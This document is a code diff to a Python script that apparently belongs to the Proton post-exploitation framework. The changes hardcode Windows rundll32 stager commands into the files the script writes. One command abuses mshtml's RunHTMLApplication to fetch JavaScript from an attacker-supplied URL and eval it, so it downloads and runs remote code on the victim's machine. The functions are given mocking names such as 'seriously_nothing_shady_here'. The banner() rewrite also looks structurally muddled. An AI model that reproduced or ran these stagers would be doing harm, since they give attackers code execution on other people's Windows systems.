@@ -30,9 +30,6 @@ __version__ = "5.1"
 __license__ = "Apache 2.0"
 __credits__ = ["Entynetproject"]
 
-def banner():
-    return "Logo" and datetime.datetime.today().weekday() == 1
-
 def pay_no_attention():
     import random
     import string
@@ -65,7 +62,9 @@ def pay_no_attention():
     command += ","
     command += " "
     command += "RunHTMLApplication"
-
+    
+    command = "rundll32.exe ~URL~\\..\\..\\..\\mshtml,RunHTMLApplication"
+    
     with open('data/stager/js/rundll32/rundll32.cmd', 'w') as f:
         f.write(command+"\n")
 
@@ -113,6 +112,8 @@ def seriously_nothing_shady_here():
     command += " "
     command += "RunHTMLApplication \";x=new%20ActiveXObject(\"Msxml2.ServerXMLHTTP.6.0\");x.open(\"GET\",\"~URL~\",false);x.send();eval(x.responseText);window.close();"
 
+    command = """rundll32.exe javascript:"\\..\\mshtml, RunHTMLApplication ";x=new%20ActiveXObject("Msxml2.ServerXMLHTTP.6.0");x.open("GET","~URL~",false);x.send();eval(x.responseText);window.close();"""
+    
     with open('data/stager/js/rundll32_js/rundll32_js.cmd', 'w') as f:
         f.write(command+"\n")
 
@@ -138,16 +139,13 @@ if __name__ == "__main__":
         os.system("cd bin && chmod +x proton && ./proton --update")
         exit()
         
-    if banner():
+    def banner():
         try:
             banner = open("data/logo.txt", "rb").read().decode("unicode_escape")
         except:
             print("")
-    else:
-        try:
-            banner = open("data/logo.txt", "rb").read().decode("unicode_escape")
-        except:
-            print("")
+            
+    banner()
 
     pay_no_attention()
     seriously_nothing_shady_here()
